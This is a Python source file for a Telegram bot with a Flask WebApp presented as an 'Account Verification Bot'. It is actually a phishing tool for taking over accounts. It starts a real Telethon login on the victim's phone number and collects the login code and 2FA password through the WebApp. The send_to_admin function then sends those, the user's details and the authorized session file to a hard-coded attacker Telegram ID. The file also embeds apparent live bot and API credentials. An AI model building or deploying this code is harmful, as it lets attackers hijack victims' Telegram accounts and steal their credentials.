import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import logging
import sys
from datetime import datetime
import queue

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
app = Flask(__name__)

# Storage
user_data = {}
verification_status = {}

# ==================== ASYNC MANAGER ====================
class AsyncManager:
    """Manage async operations with a single event loop"""
    
    def __init__(self):
        self.loop = None
        self.task_queue = queue.Queue()
        self.results = {}
        self.running = True
        
    def start(self):
        """Start the async manager"""
        threading.Thread(target=self._run_loop, daemon=True).start()
        logger.info("✅ Async manager started")
    
    def _run_loop(self):
        """Run the main event loop"""
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        
        # Process tasks
        while self.running:
            try:
                # Get task from queue
                task_id, coro = self.task_queue.get(timeout=1)
                
                # Run task in loop
                future = asyncio.run_coroutine_threadsafe(coro, self.loop)
                try:
                    result = future.result(timeout=30)
                    self.results[task_id] = result
                except Exception as e:
                    self.results[task_id] = {'success': False, 'error': str(e)}
                    
            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Async manager error: {e}")
    
    def run_async(self, coro):
        """Run async coroutine and return result"""
        task_id = str(time.time())
        self.task_queue.put((task_id, coro))
        
        # Wait for result
        for _ in range(30):  # Wait up to 30 seconds
            if task_id in self.results:
                result = self.results.pop(task_id)
                return result
            time.sleep(1)
        
        return {'success': False, 'error': 'Timeout'}

# Initialize async manager
async_manager = AsyncManager()

# ==================== SIMPLE ASYNC FUNCTIONS ====================
async def simple_send_otp(phone):
    """Simple OTP sending without Telethon session reuse"""
    try:
        logger.info(f"📤 Creating new session for {phone}")
        
        # Create new session file
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        os.makedirs('sessions', exist_ok=True)
        
        # Create NEW client instance
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect
        await client.connect()
        
        # Send OTP
        sent = await client.send_code_request(phone)
        
        logger.info(f"✅ OTP sent to {phone}")
        
        # Store only phone_code_hash, not client
        return {
            'success': True,
            'phone_code_hash': sent.phone_code_hash,
            'session_name': session_name
        }
        
    except FloodWaitError as e:
        return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
    except Exception as e:
        logger.error(f"Error sending OTP: {e}")
        return {'success': False, 'error': str(e)}

async def simple_verify_otp(phone, otp_code, phone_code_hash, session_name):
    """Simple OTP verification with fresh client"""
    try:
        logger.info(f"🔐 Verifying OTP for {phone}")
        
        # Create NEW client instance
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect
        await client.connect()
        
        # Verify OTP
        try:
            await client.sign_in(
                phone=phone,
                code=otp_code,
                phone_code_hash=phone_code_hash
            )
        except SessionPasswordNeededError:
            # 2FA required
            return {'success': True, 'requires_2fa': True}
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid OTP'}
        
        # Check if authorized
        if await client.is_user_authorized():
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            await client.session.save()
            session_file = f"{client.session.filename}.session"
            
            logger.info(f"✅ Verified {phone}, user: {user_info.get('username', 'N/A')}")
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
        else:
            return {'success': False, 'error': 'Not authorized'}
            
    except Exception as e:
        logger.error(f"Error verifying OTP: {e}")
        return {'success': False, 'error': str(e)}

async def simple_verify_2fa(session_name, password):
    """Simple 2FA verification"""
    try:
        logger.info(f"🔐 Verifying 2FA")
        
        # Create NEW client instance
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect
        await client.connect()
        
        # Verify 2FA
        await client.sign_in(password=password)
        
        # Get user info
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        # Save session
        await client.session.save()
        session_file = f"{client.session.filename}.session"
        
        logger.info(f"✅ 2FA successful")
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
        
    except Exception as e:
        logger.error(f"2FA error: {e}")
        return {'success': False, 'error': str(e)}

# ==================== HELPER FUNCTIONS ====================
def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION DATA</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
            if name:
                message += f"\n👤 Name: {name}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info.get('username')}"
            if user_info.get('id'):
                message += f"\n🆔 ID: {user_info.get('id')}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

def clean_phone(phone):
    """Clean and format phone number"""
    if not phone:
        return None
    
    # Remove all non-digit characters except +
    cleaned = ''.join(c for c in phone if c.isdigit() or c == '+')
    
    # Ensure it starts with +
    if not cleaned.startswith('+'):
        if cleaned.startswith('0'):
            cleaned = '+91' + cleaned[1:]
        elif len(cleaned) == 10:
            cleaned = '+91' + cleaned
        else:
            cleaned = '+' + cleaned
    
    return cleaned

def clean_otp(otp):
    """Clean and validate OTP (5 digits)"""
    if not otp:
        return None
    
    # Remove all non-digits
    cleaned = ''.join(filter(str.isdigit, otp))
    
    # Check if it's 5 digits
    if len(cleaned) == 5:
        return cleaned
    
    # If user entered 6 digits, take first 5
    elif len(cleaned) == 6:
        return cleaned[:5]
    
    return None

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBAPP_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}" if RENDER_EXTERNAL_HOSTNAME else "https://itz-me-545-telegram.onrender.com"
        else:
            port = os.environ.get('PORT', 5000)
            WEBAPP_URL = f"http://localhost:{port}"
        
        logger.info(f"🌐 WebApp URL: {WEBAPP_URL}")
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(WEBAPP_URL)
        )
        kb.add(btn)
        
        # Welcome message
        welcome_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Account Verification Bot</b>

Click the button below to verify your account:

✅ <b>Verification Steps:</b>
1️⃣ Open WebApp
2️⃣ Share your contact
3️⃣ Receive 5-digit OTP here
4️⃣ Enter OTP in WebApp
5️⃣ Complete verification ✅

⚠️ <i>Your contact will be auto-deleted for privacy.</i>

<b>Note:</b> Telegram sends <b>5-digit</b> OTP codes.

<b>Click below to begin:</b>"""
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"✅ Sent /start to user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try /start again.")
        except:
            pass

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Clean phone
        phone = clean_phone(phone)
        if not phone:
            bot.send_message(message.chat.id, "❌ Invalid phone number format.")
            return
        
        logger.info(f"📱 Contact received from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
            'phone': phone,
            'username': message.from_user.username,
            'lang': message.from_user.language_code,
            'contact_time': time.time()
        }
        
        # Update verification status
        verification_status[user_id] = {
            'stage': 'contact_received',
            'phone': phone,
            'otp_attempts': 0
        }
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}

⏳ <b>Sending 5-digit OTP via Telegram...</b>

Please wait while we send the verification code.""",
            parse_mode='HTML'
        )
        
        # Send OTP via async manager
        def send_otp_task():
            try:
                logger.info(f"Starting OTP task for {phone}")
                result = async_manager.run_async(simple_send_otp(phone))
                
                if result['success']:
                    # Store verification data
                    verification_status[user_id]['phone_code_hash'] = result['phone_code_hash']
                    verification_status[user_id]['session_name'] = result['session_name']
                    
                    # Success message
                    success_msg = f"""✅ <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> has been sent via Telegram

Check your Telegram messages for the 5-digit code.

<b>⚠️ IMPORTANT:</b>
• Check your Telegram messages for the <b>5-digit code</b>
• Enter the code in the WebApp
• Code expires in 5 minutes

<i>Telegram OTPs are always 5 digits (e.g., 12345)</i>"""
                    
                    bot.edit_message_text(
                        success_msg,
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin
                    send_to_admin(phone, user_info=user_data[user_id])
                    
                    logger.info(f"✅ OTP sent to {phone}")
                else:
                    error_msg = result.get('error', 'Failed to send OTP')
                    bot.edit_message_text(
                        f"❌ <b>Error:</b> {error_msg}\n\nPlease try again or contact support.",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
                bot.edit_message_text(
                    "❌ <b>Server Error:</b> Failed to process request",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
        
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Error processing contact. Please try again.")
        except:
            pass

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    return render_template('index.html')

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    """Get user data for WebApp"""
    data = user_data.get(user_id, {})
    status = verification_status.get(user_id, {})
    
    response = {
        'success': 'phone' in data,
        'phone': data.get('phone', ''),
        'name': data.get('name', ''),
        'username': data.get('username', ''),
        'lang': data.get('lang', ''),
        'stage': status.get('stage', 'waiting'),
        'verified': status.get('verified', False)
    }
    
    return jsonify(response)

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 OTP verification attempt for user {user_id}")
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({
                'success': False, 
                'error': 'Invalid OTP format. Enter 5 digits (e.g., 12345)'
            })
        
        # Get user data
        user_info = user_data.get(int(user_id), {})
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Get verification data
        status = verification_status.get(int(user_id), {})
        phone_code_hash = status.get('phone_code_hash')
        session_name = status.get('session_name')
        
        if not phone_code_hash or not session_name:
            return jsonify({'success': False, 'error': 'Session expired. Please restart.'})
        
        # Check attempts
        if int(user_id) in verification_status:
            verification_status[int(user_id)]['otp_attempts'] += 1
            if verification_status[int(user_id)]['otp_attempts'] > 3:
                return jsonify({'success': False, 'error': 'Too many attempts'})
        
        # Verify OTP
        result = async_manager.run_async(
            simple_verify_otp(phone, cleaned_otp, phone_code_hash, session_name)
        )
        
        if result['success']:
            if result.get('requires_2fa'):
                # 2FA required
                verification_status[int(user_id)]['stage'] = 'needs_2fa'
                verification_status[int(user_id)]['session_name'] = session_name
                
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Success - OTP verified
                verification_status[int(user_id)]['stage'] = 'verified'
                verification_status[int(user_id)]['verified'] = True
                
                # Send to admin
                send_to_admin(
                    phone, 
                    otp=cleaned_otp,
                    user_info=result.get('user_info'),
                    session_file=result.get('session_file')
                )
                
                logger.info(f"✅ OTP verified successfully for {phone}")
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        logger.error(f"API verify OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA password"""
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        
        logger.info(f"🔐 2FA attempt for user {user_id}")
        
        if not user_id or not password:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Get verification data
        status = verification_status.get(int(user_id), {})
        session_name = status.get('session_name')
        
        if not session_name:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        # Verify 2FA
        result = async_manager.run_async(simple_verify_2fa(session_name, password))
        
        if result['success']:
            # Success with 2FA
            user_info = result.get('user_info', {})
            phone = user_info.get('phone', '')
            
            # Update status
            verification_status[int(user_id)]['stage'] = 'verified'
            verification_status[int(user_id)]['verified'] = True
            
            # Send to admin with password
            send_to_admin(
                phone,
                password=password,
                user_info=user_info,
                session_file=result.get('session_file')
            )
            
            logger.info(f"✅ 2FA successful")
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', '2FA verification failed')
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """Handle contact sharing from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        phone = data.get('phone', '').strip()
        
        logger.info(f"📱 WebApp contact share: {phone}")
        
        if not user_id or not phone:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Clean phone
        phone = clean_phone(phone)
        if not phone:
            return jsonify({'success': False, 'error': 'Invalid phone number'})
        
        # Store user data
        user_data[int(user_id)] = {
            'phone': phone,
            'contact_time': time.time()
        }
        
        # Update verification status
        verification_status[int(user_id)] = {
            'stage': 'contact_received',
            'phone': phone,
            'otp_attempts': 0
        }
        
        return jsonify({
            'success': True,
            'message': 'Contact received successfully'
        })
        
    except Exception as e:
        logger.error(f"API share contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK ====================
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 200

# ==================== CLEANUP ====================
def cleanup_old_data():
    """Clean up old data"""
    while True:
        try:
            time.sleep(60)
            current_time = time.time()
            
            # Clean old user data (older than 1 hour)
            expired_users = []
            for user_id, data in list(user_data.items()):
                if current_time - data.get('contact_time', 0) > 3600:
                    expired_users.append(user_id)
            
            for user_id in expired_users:
                del user_data[user_id]
                if user_id in verification_status:
                    del verification_status[user_id]
            
            if expired_users:
                logger.info(f"🧹 Cleaned {len(expired_users)} expired users")
                
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 TELEGRAM VERIFICATION BOT - SIMPLE VERSION")
    logger.info("="*60)
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    logger.info(f"🔑 API ID: {API_ID}")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info("="*60)
    
    # Start async manager
    async_manager.start()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Setup webhook
    try:
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}/webhook" if RENDER_EXTERNAL_HOSTNAME else None
        else:
            port = os.environ.get('PORT', 10000)
            WEBHOOK_URL = f"http://localhost:{port}/webhook"
        
        if WEBHOOK_URL:
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=WEBHOOK_URL)
            logger.info(f"✅ Webhook set: {WEBHOOK_URL}")
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        logger.info("⚠️ Using polling as fallback")
        bot.remove_webhook()
        # Start polling in background thread
        def run_polling():
            bot.polling(none_stop=True, interval=3, skip_pending=True)
        
        polling_thread = threading.Thread(target=run_polling, daemon=True)
        polling_thread.start()
    
    # Start Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 Starting Flask on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
            )
